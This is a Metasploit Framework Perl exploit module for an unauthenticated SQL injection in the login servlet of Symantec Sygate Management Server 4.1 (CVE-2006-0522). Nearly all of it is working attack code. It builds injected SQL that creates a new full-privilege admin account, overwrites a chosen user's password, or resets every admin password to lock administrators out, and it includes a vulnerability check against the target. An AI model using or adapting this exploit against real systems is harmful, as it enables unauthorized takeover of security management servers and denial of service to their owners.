Symantec Sygate Management Server (login) SQL Injection Exploit
===============================================================





##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

##
# 
# Affected product : Sygate Management Server v4.1 (at least)
#
# Vulnerability    : SQL-Injection in login page
# Required privs   : Network access to the admin interface (HTTP)
# Impact           : Raw access to the database
# Sample payload   : Create a valid admin account directly in the database  
#
# Editor status    : Official patch available
# http://securityresponse.symantec.com/avcenter/security/Content/2006.02.01.html
#
##

package Msf::Exploit::sygate_policy_manager;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;
use vars qw{$HAS_SHA1};

BEGIN 
{
	$HAS_SHA1 = 0;
	
	if (eval(&#039;require Digest::SHA1&#039;)) {
		eval(&#039;use Digest::SHA1 qw(sha1);&#039;);
		$HAS_SHA1 = 1;
	}	
}

my $advanced = { };

my $info = {
	&#039;Name&#039;     => &#039;Sygate Management Server SQL Injection&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.3 $&#039;,
	&#039;Authors&#039;  => [ &#039;Nicob <nicob[at]nicob.net>&#039; ],
	&#039;Arch&#039;     => [ &#039;x86&#039; ],
	&#039;OS&#039;       => [ &#039;win32&#039; ],
	&#039;Priv&#039;     => 0,
	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039;    => [1, &#039;ADDR&#039;,   &#039;The target address&#039;],
		&#039;RPORT&#039;    => [1, &#039;PORT&#039;,   &#039;The target port&#039;, 80],
		&#039;VHOST&#039;    => [0, &#039;DATA&#039;,   &#039;The virtual host name of the server&#039;],
		&#039;LOGIN&#039;    => [0, &#039;LOGIN&#039;,  &#039;The username to create/modify&#039;, &#039;reporting&#039;],
		&#039;PASSWD&#039;   => [0, &#039;PASSWD&#039;, &#039;The encrypted password of this user&#039;, &#039;my_passwd&#039;],
		&#039;SERVLET&#039;  => [1, &#039;DATA&#039;,   &#039;Full path of the servlet&#039;, &#039;/servlet/Sygate.Servlet.login&#039;],
		&#039;SSL&#039;      => [0, &#039;BOOL&#039;,   &#039;Use SSL&#039;],
	  },

	&#039;Description&#039; => Pex::Text::Freeform(qq{
		This module exploits a non authenticated SQL-Injection vulnerability in the
		Sygate Management Server (now Symantec Policy Manager), in order to create a new
		admin account or change the password of an existing one. Version 4.1 is known to be vulnerable.
		Version 5 is not vulnerable.
}),

	&#039;Refs&#039; =>
	  [
		[&#039;URL&#039;,   &#039;http://securityresponse.symantec.com/avcenter/security/Content/2006.02.01.html&#039;],
		[&#039;CVE&#039;,   &#039;2006-0522&#039;],
		[&#039;OSVDB&#039;, &#039;22883&#039;],
		[&#039;BID&#039;,   &#039;16452&#039;],
	  ],

	&#039;Targets&#039; => 
		[
			[&#039;Change a specific users password&#039;, &#039;change_user_passwd&#039;],
			[&#039;Create a new administrative account&#039;, &#039;add_account&#039;],
			[&#039;Reset all passwords (denial of service)&#039;, &#039;reset_all&#039;],
		],
	
	&#039;DefaultTarget&#039; => 0,
	
	&#039;Keys&#039; => [&#039;sygate&#039;],

  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host    = $self->GetVar(&#039;RHOST&#039;);
	my $vhost          = $self->VHost;
	my $target_port    = $self->GetVar(&#039;RPORT&#039;);
	my $servlet        = $self->GetVar(&#039;SERVLET&#039;);
	
	my $request =
	  "GET $servlet?uid=test1&up=test2 HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $target_host,
		&#039;PeerPort&#039; => $target_port,
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError){
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return $self->CheckCode(&#039;Connect&#039;);
	}

	$self->PrintLine("[*] Establishing a connection to the target...");

	$s->Send($request);
	my $results = $s->Recv(-1, 20);
	$s->Close();
	
	if ($results =~ /HTTP\/1\..\s+200/) {

		$self->PrintLine("[*] Vulnerable server detected!");
		return $self->CheckCode(&#039;Confirmed&#039;);
		
	} elsif ($results =~ /HTTP\/1\..\s+([345]\d+)/) {

		$self->PrintLine("[*] The Sygate Policy Manager servlet was not found.");
		return $self->CheckCode(&#039;Safe&#039;);
	}

	$self->PrintLine("[*] Generic error...");
	return $self->CheckCode(&#039;Generic&#039;);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar(&#039;RHOST&#039;);
	my $vhost          = $self->VHost;
	my $target_port    = $self->GetVar(&#039;RPORT&#039;);
	my $servlet        = $self->GetVar(&#039;SERVLET&#039;);
	my $login          = $self->GetVar(&#039;LOGIN&#039;);
	my $passwd         = $self->GetVar(&#039;PASSWD&#039;);
	my $target         = $self->Targets->[$self->GetVar(&#039;TARGET&#039;)];
	
	if (! $HAS_SHA1) {
		$self->PrintLine("[*] Please install the Digest-SHA1 module to use this exploit");
		return;
	}

	# The &#039;Password&#039; field is a hex-encoded SHA-1 digest of the "user+password" string
	my $sha1 = sha1($login.$passwd);
	$sha1 =~ s/./sprintf("%02x", ord($&))/ges;
	$sha1 = "0x".uc($sha1);

	# Maximum level of privileges
	my $privs = "255";

	
	my %sqlpayloads = 
	(
		# Create a new valid admin account (in SMS v4.1) -- [BUG] : Can&#039;t access the Users panel :-(
		&#039;add_account&#039; => 
			"insert into CMS35.Admin (RecUpdateTime,LoginName,AdminNickName,Password,AdminRights,".
			"AdminEmail,FailedLogin,AlertOnFailure,AlertFailureThreshold,OnlineState) ".
			"values (getutcdate(),&#039;$login&#039;,&#039;$login&#039;,$sha1,&#039;$privs&#039;,&#039;&#039;,0,0,0,0)",

		# Reset the password of every account to "0x4141" (in SMS v4.1) -- Denial of Service only !
		&#039;reset_all&#039; =>
			"update CMS35.Admin set Password=cast(&#039;AA&#039; as varbinary)",
	
		# Change the password of the selected account (in SMS v4.1) -- Yeah, full access to &#039;admin&#039; !
		&#039;change_user_passwd&#039; =>
			"update CMS35.Admin set Password=$sha1 where LoginName=&#039;$login&#039;",
	);
	
	my $payload = $sqlpayloads{ $target->[1] };

	# Inject our payload
	$servlet = $servlet."?uid=".$self->URLEncode("&#039;;$payload -- ")."&up=foo";

	my $request =
	  "GET $servlet HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $target_host,
		&#039;PeerPort&#039; => $target_port,
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError){
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target...");
	$self->PrintLine(&#039; &#039;);
	$s->Send($request);
	my $results = $s->Recv(-1, 20);
	
	if ($results =~ /HTTP\/1\.. 200 OK/im) {
		# Seems to be fine ;-)
		$self->PrintLine("OK. Now try to log with user &#039;$login&#039; and passwd &#039;$passwd&#039;");
	} else {
		$self->PrintLine("Doh ! Are you sure this server is vulnerable ?");
	}

	$s->Close();
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack(&#039;C*&#039;, $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar(&#039;VHOST&#039;) || $self->GetVar(&#039;RHOST&#039;);
	return $name;
}

1;



